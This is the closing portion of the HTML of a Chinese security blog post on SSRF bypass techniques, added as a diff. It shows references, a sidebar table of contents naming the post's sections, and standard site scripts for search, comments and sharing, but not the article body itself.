href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a><br>[8] <a href="http://www.zerokeeper.com/web-security/ssrf-learning-notes.html" target="_blank" rel="noopener">http://www.zerokeeper.com/web-security/ssrf-learning-notes.html</a><br>[9] <a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf" target="_blank" rel="noopener">D2T2-YuHong-Attack Surface Extended by URL Schemes.pdf</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文标题:</strong>
+    <a href="/2018/12/19/ssrf小记/">ssrf突破边界</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1ypt0
+  </li>
+  <li class="post-copyright-author">
+    <strong>发布时间:</strong>
+    2018年12月19日 - 14:12
+  </li>
+  <li class="post-copyright-author">
+    <strong>最后更新:</strong>
+    2018年12月19日 - 15:12
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://lypto.me/2018/12/19/ssrf小记/" title="ssrf突破边界">http://lypto.me/2018/12/19/ssrf小记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/绕过/" rel="tag"># 绕过</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/11/Linux-socket-编程模型总结/" rel="next" title="Linux socket 编程模型总结">
+                <i class="fa fa-chevron-left"></i> Linux socket 编程模型总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="1ypt0">
+          <p class="site-author-name" itemprop="name">1ypt0</p>
+           
+              <p class="site-description motion-element" itemprop="description">Please remember that. The Titanic was not supposed to sink, but it did.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=857896&auto=0&height=66"></iframe>
+
+<div align="left" font-family:="" "arial","microsoft="" yahei","����","����",sans-serif="">
+
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/IversionBY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:mini.lypto@gmail.com" target="_blank" title="GMail">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  GMail
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/littelpotato" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.xdsec.club/" title="XDSEC" target="_blank">XDSEC</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://cesslab.club/#/" title="cesslab" target="_blank">cesslab</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://firmianay.github.io/" title="超哥" target="_blank">超哥</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nen9ma0.github.io/" title="大能猫" target="_blank">大能猫</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://dimo233.github.io/" title="去师" target="_blank">去师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.k0rz3n.com" title="天师" target="_blank">天师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://notwo1f.github.io/" title="武师" target="_blank">武师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://1phan.cc/" title="1phan" target="_blank">1phan</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.sky3.pw/" title="sky" target="_blank">sky</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lookupes.com/" title="lookup" target="_blank">lookup</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://herbwen.com/" title="文师" target="_blank">文师</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-漏洞点"><span class="nav-number">1.</span> <span class="nav-text">0x01 漏洞点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-攻击流程"><span class="nav-number">2.</span> <span class="nav-text">0x02 攻击流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-use-protocol"><span class="nav-number">3.</span> <span class="nav-text">0x03 use protocol</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#file协议的文件读取"><span class="nav-number">3.1.</span> <span class="nav-text">file协议的文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dict协议信息收集"><span class="nav-number">3.2.</span> <span class="nav-text">dict协议信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher获取shell"><span class="nav-number">3.3.</span> <span class="nav-text">gopher获取shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http协议访问裸奔restful接口"><span class="nav-number">3.4.</span> <span class="nav-text">http协议访问裸奔restful接口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ldap"><span class="nav-number">3.5.</span> <span class="nav-text">ldap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#……"><span class="nav-number">3.6.</span> <span class="nav-text">……</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-bypass-relevance"><span class="nav-number">4.</span> <span class="nav-text">0x04 bypass relevance</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#common"><span class="nav-number">4.1.</span> <span class="nav-text">common</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-fsockopen-cheatsheep"><span class="nav-number">4.2.</span> <span class="nav-text">php fsockopen() cheatsheep</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-readfile-and-parse-url"><span class="nav-number">4.3.</span> <span class="nav-text">php readfile() and parse_url()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Abusing-URL-Parsers"><span class="nav-number">4.4.</span> <span class="nav-text">Abusing_URL_Parsers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-pinning-与-DNS-rebinding"><span class="nav-number">4.5.</span> <span class="nav-text">DNS pinning 与 DNS rebinding</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文献"><span class="nav-number">5.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1ypt0</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://lypto.me/2018/12/19/ssrf小记/';
+          this.page.identifier = '2018/12/19/ssrf小记/';
+          this.page.title = 'ssrf突破边界';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://iversion lee.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "a1fe7273de6e47ad9f9802a493c2cccf",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+
+  
+
+  
+
+</div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end --></body></html>
